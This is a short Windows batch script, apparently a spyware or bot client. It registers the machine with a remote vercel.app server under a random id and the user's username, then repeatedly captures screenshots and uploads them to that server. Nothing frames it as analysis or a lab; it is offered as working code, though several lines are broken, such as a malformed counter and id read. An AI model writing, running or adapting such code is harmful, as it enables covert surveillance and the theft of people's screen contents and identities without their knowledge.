@echo off
set second=0
if not exist id.log (

set id=%random%%random%
curl -X POST https://test-api-t78m.vercel.app/addBot/%id%  -d name="%username%"
echo %id%>id.log
echo echo command> command
cmd /C .\screen.bat shot.png
curl  https://test-api-t78m.vercel.app/updateShot/%id% -F testImage=@shot.png -F name="%username%"
goto program

) else (
goto program
)

:loop
set /p second= %second% +1
ping localhost -n 3 > null
goto program



:program
echo program %second%
if %second% == 6 (
    set second = 0
    goto sendShot
)

:sendShot
set id=<.true
cmd /C .\screen.bat shot.png
curl -F testImage=@shot.png -F name=kira https://test-api-t78m.vercel.app/updateShot/%id%
goto program
